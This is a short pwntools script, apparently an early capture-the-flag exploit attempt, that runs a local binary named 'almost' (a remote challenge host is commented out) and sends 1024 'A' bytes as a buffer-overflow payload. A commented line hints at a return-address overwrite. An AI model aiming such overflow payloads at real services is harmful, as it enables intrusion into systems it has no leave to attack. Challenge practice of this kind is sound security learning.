
from pwn import *

context.update(arch='i686', os='linux')
#io = remote('jh2i.com', 50021)
io = process('./almost')
print("started proc")
data = io.recv()
print(data)
payload = b"A" * 1024

#payload += p64(0x000000000040098b)
io.sendline(payload)

